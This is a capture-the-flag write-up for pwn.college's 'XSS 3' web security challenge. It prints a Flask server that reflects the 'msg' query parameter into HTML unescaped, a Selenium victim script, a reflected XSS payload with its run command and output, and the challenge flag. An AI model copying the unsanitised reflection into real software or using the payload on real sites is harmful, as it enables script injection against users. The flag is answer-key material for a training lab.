---
layout: page
title: "XSS 3 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

In this challenge, we are given a basic Flask web application that takes user input from the `msg` query parameter and reflects it on the page. Additionally, there is a headless browser (Selenium) acting as the victim that visits the crafted link and checks if a JavaScript alert is triggered.

## 🧪 Source Code Analysis

### 📄 `/challenge/server`

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET"])
def challenge_get():
    return f"""
        <html><body>
        <h1>pwnmsg ephemeral message service</h1>
        The message:
        {flask.request.args.get("msg", "(none)")}
        <hr>
        <form>
            Craft a message:
            <input type=text name=msg>
            <input type=submit value="Make URL!">
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
The vulnerability lies in the fact that the msg parameter is directly injected into the HTML without any sanitization or encoding, resulting in a reflected XSS vulnerability.

### /challenge/victim
```python
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} URL")
    sys.exit(1)

challenge_url = sys.argv[1]

url_parsed = urllib.parse.urlparse(challenge_url)
if url_parsed.hostname != "challenge.localhost":
    print("Hostname should be 'challenge.localhost'.")
    sys.exit(2)
if url_parsed.port not in {None, 80}:
    print("Port should be 80.")
    sys.exit(3)

print(f"Visiting {challenge_url}")
browser.get(challenge_url)
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read().strip())
```
This script simulates a victim visiting the attacker’s crafted XSS URL. If an alert box is triggered, the flag is printed.

---

## Exploit
A simple XSS payload like the following is enough to trigger an alert:
```
http://challenge.localhost/?msg=<script>alert("PWNED")</script>
```
Run the following:
```bash
/challenge/victim 'http://challenge.localhost/?msg=<script>alert("PWNED")</script>'
```
Output:
```
Visiting http://challenge.localhost/?msg=<script>alert("PWNED")</script>
Alert triggered! Your reward:
pwn.college{w80D_zz1e13y2tS3mvOEVhcIOmQ.QX0kzMzwSM0IzMyEzW}
```

---

## Flag
```
pwn.college{w80D_zz1e13y2tS3mvOEVhcIOmQ.QX0kzMzwSM0IzMyEzW}
```

---
